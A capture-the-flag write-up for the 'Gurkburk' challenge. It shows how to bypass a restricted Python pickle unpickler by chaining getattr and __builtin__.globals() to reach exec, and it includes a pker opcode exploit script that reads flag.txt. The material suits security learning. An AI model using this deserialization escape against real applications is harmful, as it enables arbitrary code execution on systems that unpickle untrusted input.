# Gurkburk

## Problem

The flag is located in `./flag.txt`.

## Solution

Pickle is used to save and load notes into the application.

![](../../.gitbook/assets/b83bd3862fc8415a9a08fa222b4fbd00.png)

![](../../.gitbook/assets/06f07bd072064fb4a8827f6db569c53a.png)

Normally, we would be able to use the `__reduce__()` method to make the program call functions like `os.system()` \(see [https://davidhamann.de/2020/04/05/exploiting-python-pickle/](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)\).

See [https://docs.python.org/3.7/library/pickle.html\#restricting-globals](https://docs.python.org/3.7/library/pickle.html#restricting-globals). The modules we can unpickle are restricted to `__main__`, `__builtin__` and `copyreg`. `eval` and `exec` are also banned.

![](../../.gitbook/assets/a67175be4b3d4d13a97580a116bf2716.png)

Thanks to [https://translate.google.com/translate?hl=en&sl=zh-CN&u=https://xz.aliyun.com/t/7436&prev=search](https://translate.google.com/translate?hl=en&sl=zh-CN&u=https://xz.aliyun.com/t/7436&prev=search), I found a way to bypass the restrictions.

They created an API to generate Pickle opcodes: [https://github.com/EddieIvan01/pker](https://github.com/EddieIvan01/pker) \(I made some slight modifications\)

Exploit code:

```python
getattr = GLOBAL ( '__builtin__' , 'getattr' ) 
dict = GLOBAL ( '__builtin__' , 'dict' ) 
dict_get = getattr ( dict , 'get' ) 
glo_dic = GLOBAL ( '__builtin__' , 'globals' )() 
builtins = dict_get ( glo_dic , '__builtins__' ) 
exec = getattr ( builtins , 'exec' )
exec ("print(open('flag.txt', 'r').read())") 
return
```

The idea is that using `getattr`, we can get _submodules_ of `__builtin__` \(and the submodules of the submodules\). `__builtin__.globals()` includes `builtins`, which includes `exec`. Once we have control over `exec`, we can execute arbitrary code.

![](../../.gitbook/assets/7b67c03c11e5447f8e7b010512a8ccac.png)

Submit the base64-encoded opcodes, and we obtain the flags.

![](../../.gitbook/assets/5cefd07e73384b6493eab4f5c7c5f4a4.png)

## References

1. [https://davidhamann.de/2020/04/05/exploiting-python-pickle/](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
2. [https://translate.google.com/translate?hl=en&sl=zh-CN&u=https://xz.aliyun.com/t/7436&prev=search](https://translate.google.com/translate?hl=en&sl=zh-CN&u=https://xz.aliyun.com/t/7436&prev=search)
3. [https://github.com/EddieIvan01/pker](https://github.com/EddieIvan01/pker)

